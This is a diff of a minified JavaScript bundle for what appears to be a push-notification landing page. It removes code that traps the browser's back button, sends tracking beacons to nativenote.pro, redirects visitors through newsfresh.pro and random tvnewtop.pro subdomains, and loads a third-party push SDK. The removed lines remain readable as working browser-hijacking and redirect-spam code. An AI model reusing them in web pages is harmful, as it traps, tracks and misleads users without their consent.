@@ -277,29 +277,6 @@
                 document.body.addEventListener("keydown", n), document.body.addEventListener("click", n)
             }
         }, , function(e, t, n) {
-            "use strict";
-            n.r(t);
-            var d = function() {
-                    var e = location.search.split("#")[0].split("?")[1];
-                    if (void 0 === e) return null;
-                    var o = {};
-                    return e.split("&").forEach(function(e) {
-                        var t = e.split("=");
-                        if (2 === t.length) o[t[0]] = t[1] || null;
-                        else {
-                            var n = t[0];
-                            t.shift(), o[n] = t.join("=")
-                        }
-                    }), o
-                },
-                o = d();
-            if (null !== o && void 0 !== o.bbr && "1" === o.bbr) {
-                var i = document.title,
-                    r = location.pathname + location.search;
-                history.pushState(null, i, r), window.addEventListener("popstate", function() {
-                    history.pushState({}, i, r)
-                })
-            }
             n(0);
             var u = function(t) {
                     var e = decodeURIComponent(document.cookie).split(";");
@@ -309,43 +286,8 @@
                         if (" " === e[0] && (e = e.slice(1)), e = e.split("="), t === e[0]) return n = e[1], !0
                     }), n
                 },
-                a = function(e, t, n, o) {
-                    var i = new Date;
-                    i.setTime(i.getTime() + 1e3 * n);
-                    var r = "; expires=" + i.toUTCString(),
-                        u = "";
-                    void 0 !== o && (u = "; domain=" + o), document.cookie = e + "=" + (t || "") + u + r + "; path=/"
-                },
-                s = function(e, t) {
-                    var n = new XMLHttpRequest;
-                    n.addEventListener("readystatechange", function() {
-                        if (2 === this.readyState && void 0 !== t) return t()
-                    }), n.addEventListener("error", function() {
-                        if (void 0 !== t) return t()
-                    }), n.open("GET.html", e, !0), n.responseType = "text", n.send()
-                },
-                c = function(e, t, n) {
-                    null == t && (t = "tracking");
-                    var o = 0;
-                    "tb" === e ? o = 7 : "private" === e && (o = 12);
-                    var i, r, u = d();
-                    null === u && (u = {}), i = void 0 === u.si1 || null === u.si1 ? "" : u.si1, r = void 0 === u.si2 || null === u.si2 ? "" : u.si2, i = i.slice(0, 32), r = r.slice(0, 32);
-                    var c = "https://nativenote.pro/rpe?" + ["a=1", "s=1", "act=" + o, "src=2", "p=1000864", "st=1005509", "wd=7690", "d=tvnewtop.pro", "tpl=8", "rnd=" + Math.random(), "sbid=" + encodeURIComponent(i), "sbid2=" + encodeURIComponent(r)].join("&");
-                    s(c, function() {
-                        if (a(t, "1", 86400, "tvnewtop.pro"), void 0 !== n) return n()
-                    })
-                },
                 l = function(e) {
                     null !== window.opener && void 0 !== window.opener && opener.postMessage(e, "*")
-                },
-                f = function(e, t) {
-                    var n = "https://newsfresh.pro/tb?h=waWQiOjEwMDA4NjQsInNpZCI6MTAwNTUwOSwid2lkIjo3NjkwLCJzcmMiOjJ9eyJ&amp;bbr=1&amp;si1=&amp;si2=";
-                    if (0 !== n.length) c("tb", null, function() {
-                        l({
-                            a: t ? "success" : "close"
-                        }), location.href = n
-                    });
-                    else if (void 0 !== e) return e(t)
                 },
                 p = {
                     ua: navigator.userAgent,
@@ -401,35 +343,10 @@
                             if (null !== p.ua.match(new RegExp(t[e], "i"))) return n = e, !0
                         }), n
                     }
-                },
-                v = p,
-                w = d(),
-                m = {
-                    c: 0,
-                    s: !0,
-                    r: parseInt("0", 10),
-                    next: function() {
-                        var e, t = "?",
-                            i = ["a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "x", "y", "z", "1", "2", "3", "4", "5", "6", "7", "8", "9"];
-                        i.forEach(function(e, t) {
-                            var n = Math.floor(Math.random() * (t + 1)),
-                                o = [i[n], i[t]];
-                            i[t] = o[0], i[n] = o[1]
-                        }), e = i.slice(0, 5).join(""), m.c++, null === w ? w = {
-                            i: m.c
-                        } : w.i = m.c, Object.keys(w).forEach(function(e) {
-                            null !== w[e] && (t += e + "=" + w[e] + "&")
-                        }), t = t.slice(0, -1), l({
-                            a: "next",
-                            c: m.c
-                        }), location.href = "https://" + e + ".tvnewtop.pro/weather" + t
-                    },
-                    get can() {
-                        return this.s
-                    }
                 };
-            null !== w && void 0 !== w.i && (m.c = parseInt(w.i, 10)), 0 < m.r && (m.s = m.c < m.r);
-            var h = m,
+                var v = p;
+
+            var
                 g = function(t) {
                     if (!(void 0 !== window.navigator && void 0 !== navigator.serviceWorker && void 0 !== window.PushManager && void 0 !== window.Notification)) return t(!1, "unsupported");
                     v.m(function(e) {
@@ -453,36 +370,7 @@
                     a: e ? "success" : "close"
                 }), null !== window.opener && void 0 !== window.opener && close(), document.querySelector("#botText").classList.add("isHide"), document.querySelector("#allow").classList.add("isHide"), document.querySelector("#midTop").classList.add("isHide"), document.querySelector(".msgReady__tx").classList.remove("isHide")
             }
-            var E = "convert";
-            if (h.can)
-                if ("firefox" === v.n && 2 === location.hostname.split(".").length) h.next();
-                else if (null !== u(E)) f(b, 1);
-            else {
-                var P = function() {
-                    window.edPushSDK.push(arguments)
-                };
-                window.edPushSDK = window.edPushSDK || [], P("onGranted", function() {
-                    a(E, "1", 604800, "tvnewtop.pro");
-                    var e = "";
-                    0 !== e.length ? s(e, function() {
-                        f(b, 1)
-                    }) : f(b, 1)
-                }), P("onDenied", function() {
-                    g(function(e) {
-                        e && h.next()
-                    })
-                }), P("onClose", function() {
-                    location.reload()
-                }), P("onSubscribed", function() {
-                    f(b, 1)
-                }), P("onError", function(e) {
-                    console.log(e)
-                });
-                var O = document.createElement("script");
-                O.async = !0, O.src = "https://serviceproworker.com/v1/sdk.js?h=waWQiOjEwMDA4NjQsInNpZCI6MTAwNTUwOSwid2lkIjo3NjkwLCJzcmMiOjJ9eyJ&amp;d=tvnewtop.pro&amp;tpl=8", document.head.appendChild(O), g(function(e, t) {
-                    e || ("private" === t ? c(t, null, f(b)) : f(b))
-                })
-            } else f(b);
+
             S.set({
                 ru: {
                     top1: "Нажмите",
